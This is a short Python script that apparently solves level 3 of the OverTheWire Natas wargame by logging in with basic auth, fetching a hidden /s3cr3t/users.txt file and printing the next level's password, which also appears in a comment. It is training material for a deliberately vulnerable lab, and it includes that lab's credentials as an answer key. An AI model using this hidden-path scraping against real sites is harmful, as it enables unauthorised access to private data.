import requests
import re

url = 'http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
auth = requests.auth.HTTPBasicAuth('natas3', 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
response = requests.get(url, auth=auth)
password = re.findall('natas4:(.*)', response.text)
print(password[0]) # Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

